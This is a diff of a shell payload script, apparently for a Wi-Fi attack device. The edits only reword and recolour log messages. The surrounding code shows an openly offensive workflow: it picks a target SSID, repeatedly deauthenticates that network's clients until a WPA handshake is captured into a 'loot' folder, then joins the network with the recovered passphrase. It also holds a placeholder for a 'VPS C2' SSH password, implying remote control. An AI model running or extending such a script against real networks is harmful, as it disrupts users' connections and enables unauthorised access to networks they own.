@@ -13,7 +13,7 @@ SSHPW="Enter-VPS-C2-SSH-Password-Here"
 
 # Enter target SSID:
 TARGETSSID="$(TEXT_PICKER 'Enter target network SSID' '')"
-    LOG green "Target network: $TARGETSSID"
+    LOG blue "Target network: $TARGETSSID"
     sleep 1.5
 
 # Scanning for target network:
@@ -24,7 +24,7 @@ STOP_SPINNER "${spinner1}"
 
 # If network lock/log channel to target MAC, else exit:
 if [ -n "$TARGETMAC" ]; then
-    LOG green "Target network: $TARGETSSID found!"
+    LOG green "$TARGETSSID found!"
     sleep 1.5
     LOG blue "Optomizing for handshake capture.."
     sleep 1.5
@@ -35,7 +35,7 @@ if [ -n "$TARGETMAC" ]; then
     LOG blue "Waiting for handshake capture.."
     sleep 1.5
 else
-    ALERT "Target network: $TARGETSSID not found!"
+    ALERT "$TARGETSSID not found!"
     LOG red "Exiting."
     exit 0
 fi
@@ -53,7 +53,7 @@ else
     while [ -z "$PCAP" ]; do
         LOG red "Handshake not found!"
         sleep 1.5
-        spinner2=$(START_SPINNER "Deauthing $TARGETSSID re-checking..")
+        spinner2=$(START_SPINNER "Deauthing $TARGETSSID and re-checking..")
         DEAUTHTARG
         sleep 60
         PCAP=$(find /root/loot/handshakes -name "*$CLEANMAC*_handshake.22000" | head -n 1)
@@ -109,7 +109,7 @@ LOG green "$MAPSSID shutdown complete!"
 sleep 1.5
 
 # Get on network:
-spinner3=$(START_SPINNER "Connecting to: $TARGETSSID..")
+spinner3=$(START_SPINNER "Connecting to $TARGETSSID..")
     WIFI_CONNECT wlan0cli "$TARGETSSID" psk2 "$TARGETPASS" ANY
     LANCONNECTED="false"
     for i in {1..12}; do
@@ -124,12 +124,12 @@ spinner3=$(START_SPINNER "Connecting to: $TARGETSSID..")
 STOP_SPINNER "${spinner3}"
 
 if [ "$LANCONNECTED" != "true" ]; then
-    ALERT "Could not connect to: $TARGETSSID!"
+    ALERT "Could not connect to $TARGETSSID!"
     LOG red "Exiting."
     exit 0
 fi
 
-LOG green "Connected to: $TARGETSSID!"
+LOG green "Connected to $TARGETSSID!"
 sleep 1.5
 
 # Check for internet connectvity:
